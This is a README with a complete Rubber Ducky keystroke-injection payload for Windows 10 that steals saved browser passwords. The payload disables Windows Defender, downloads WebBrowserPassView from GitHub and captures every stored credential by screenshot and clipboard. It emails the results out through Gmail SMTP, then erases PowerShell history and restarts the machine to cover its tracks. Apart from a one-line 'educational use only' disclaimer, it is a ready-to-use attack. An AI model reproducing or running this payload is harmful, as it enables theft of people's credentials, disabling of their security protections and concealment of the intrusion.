# Web-Browser-Password-Grabber
Rubber ducky payload that downloads WebBrowserPasswordView file and screenshots / duplicates the passwords. Works for Windows 10.

Note:

This payload will only work IF:
  * The pc is running on windows 10
  * Windows Defender is disabled
  * There is no sophisticated antivirus installed.
 
 Runview:

This payload works by disabling windows defender, downloading an app that views all 
saved passwords on all browsers. The payload then screenshots the interface, and 
then copy-pastes all of the data. It then emails you all of the files that were created, 
removes powershell history & the payload, and then shut's down the pc.

**I AM NOT RESPONSIBLE FOR ANY MISUSE OF THIS PAYLOAD. IT'S USE IS FOR EDUCATIONAL AND TESTING USE ONLY. PLEASE DO NOT USE THIS IN ANY MALICIOUS WAYS!!!**

Payload:

```
DEFAULTDELAY 200
DELAY 500
GUI r
DELAY 200
ESCAPE
DELAY 200
TAB
DELAY 100
ENTER
DELAY 500
STRING virus & threat protection
DELAY 200
ENTER
DELAY 1200
TAB 
DELAY 100
TAB
DELAY 100
TAB
DELAY 100
TAB
DELAY 500
ENTER
DELAY 500
SPACE 
DELAY 500
ALT y
DELAY 100
GUI r
DELAY 300
STRING powershell
DELAY 300
CTRL-SHIFT ENTER
DELAY 500
ALT y
DELAY 500
STRING cd $home
ENTER
STRING powershell (new-object System.Net.WebClient).DownloadFile('https://github.com/Mythaman/Web-Browser-Password-Grabber/raw/main/WebBrowserPassView.exe','WebBrowserHandler.exe')
ENTER
DELAY 1000
STRING start 'WebBrowserHandler.exe'-WindowStyle maximized
ENTER
DELAY 500
WINDOWS PRINTSCREEN
DELAY 200
CTRL a
DELAY 200
CTRL c
DELAY 500
GUI r
DELAY 500
STRING powershell
DELAY 200
CTRL-SHIFT ENTER
DELAY 1000
ALT y
DELAY 500
STRING cd $home
ENTER
STRING Stop-Process -Name 'WebBrowserHandler'
ENTER
STRING Remove-Item 'WebBrowserHandler.exe'
ENTER
STRING Remove-MpPreference -ExclusionPath C:\Users
ENTER
STRING $SMTPServer = 'smtp.gmail.com'
ENTER
STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
ENTER
STRING $SMTPInfo.EnableSsl = $true
ENTER
STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('YOUR-EMAIL-BEFORE-THE-@
SHIFT 2
STRING gmail.com', 'YOUR-EMAILS-PASSWORD');
ENTER
STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
ENTER
STRING $ReportEmail.From = 'YOUR-EMAIL-BEFORE-THE-@
SHIFT 2
STRING gmail.com'
ENTER
STRING $ReportEmail.To.Add('YOUR-EMAIL-BEFORE-THE-@
SHIFT 2
STRING gmail.com')
ENTER
STRING $ReportEmail.Subject = 'Passwords Successfully Logged. Data includes Copy-Paste of credentials & a screenshot aswell.'
ENTER
STRING $ReportEmail.Body = Get-Clipboard
ENTER
STRING cd $home\Pictures\Screenshots
ENTER
STRING $Latest = gci $home\Pictures\Screenshots | sort LastWriteTime | select -last 1
ENTER
STRING Rename-Item $Latest
ENTER
DELAY 200
STRING FileToSend.png
ENTER
DELAY 200
STRING $ReportEmail.Attachments.Add('$home\Pictures\Screenshots\FileToSend.png')
ENTER
STRING $SMTPInfo.Send($ReportEmail)
ENTER
STRING Remove-Item (Get-PSreadlineOption).HistorySavePath
ENTER
STRING Restart-Computer
ENTER
```
